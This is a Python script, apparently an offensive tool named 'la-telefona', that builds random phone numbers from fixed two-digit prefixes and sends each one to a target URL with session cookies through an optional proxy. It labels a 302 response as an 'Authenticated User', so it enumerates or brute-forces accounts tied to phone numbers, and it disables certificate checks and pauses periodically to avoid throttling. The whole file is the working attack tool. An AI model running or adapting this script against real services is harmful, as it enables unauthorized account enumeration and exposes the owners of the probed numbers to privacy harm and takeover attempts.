#!/usr/bin/python3



from target import target
from cookies import cookie
from proxy import proxy
import requests
import random
import urllib3
import time
import sys



#Just colors
WRO = '\33[91m'
NG = '\33[0m'
RIG = '\33[94m'
HT = '\33[0m'

#Delimeters
ddd = list(range(11, 24))
fixos = list(range(67, 99))


#Counter for requests
count = 0


print("Created by: SickAndTired\nhttps://github.com/S1ckAndTired/la-telefona")
print("                                                                     ")



#SSL warnings disabled
requests.urllib3.disable_warnings()


def numeros():
    global count
    for d in ddd:
        for pre in fixos:
            part1=str(d)+str(pre)
            for f in range(100000):
                random_numbers = random.randint(100000, 1000000)
                numeros.var = (part1+str(random_numbers))
                count = count + 1
                url = target.var
                req = requests.get(url+numeros.var, cookies=cookie.var, proxies=proxy.var, verify=False, allow_redirects=False)
                status = req.status_code
                #print(status)
                if status != 302:
                    print(WRO + "[-]" + NG +  f"Invalid User - {numeros.var}")
                else:
                    print(RIG + "[+]" + HT + f"Authenticated User - {numeros.var}")
                if count%3 == 0:
                    for i in "Cooling Down...\n":
                            sys.stdout.write(i)
                            sys.stdout.flush()
                            time.sleep(0.5)


target()
cookie()
proxy()
numeros()

